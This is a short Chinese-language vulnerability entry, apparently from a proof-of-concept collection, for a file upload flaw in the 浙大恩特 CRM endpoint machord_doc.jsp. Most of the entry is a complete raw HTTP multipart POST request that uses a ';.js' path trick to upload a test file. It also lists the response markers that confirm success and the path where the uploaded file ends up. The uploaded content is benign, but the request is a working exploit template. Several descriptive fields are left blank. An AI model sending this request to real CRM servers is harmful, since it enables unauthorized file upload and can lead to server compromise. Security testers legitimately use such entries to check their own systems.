﻿# 浙大恩特CRM machord_doc.jsp文件上传

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：

> 验证脚本：HTTP

```
POST /entsoft_en/Storage/machord_doc.jsp;.js?formID=upload&machordernum=&fileName=dudesuite.txt&strAffixStr=&oprfilenam=null&gesnum= HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryQzxXQpKIb1f32N11

------WebKitFormBoundaryQzxXQpKIb1f32N11
Content-Disposition: form-data; name="oprfilenam"

null
------WebKitFormBoundaryQzxXQpKIb1f32N11
Content-Disposition: form-data; name="uploadflg"

0
------WebKitFormBoundaryQzxXQpKIb1f32N11
Content-Disposition: form-data; name="strAffixStr"


------WebKitFormBoundaryQzxXQpKIb1f32N11
Content-Disposition: form-data; name="selfilenam"


------WebKitFormBoundaryQzxXQpKIb1f32N11
Content-Disposition: form-data; name="uploadfile"; filename="dudesuite.txt"
Content-Type: image/png

dudesuite
------WebKitFormBoundaryQzxXQpKIb1f32N11--
```

> 响应代码特征：200

> 响应内容特征：dudesuite.txt

> 上传文件定位：/enterdoc/Machord/dudesuite.txt

> 验证文件来源：浙大恩特CRM machord_doc.jsp文件上传.poc
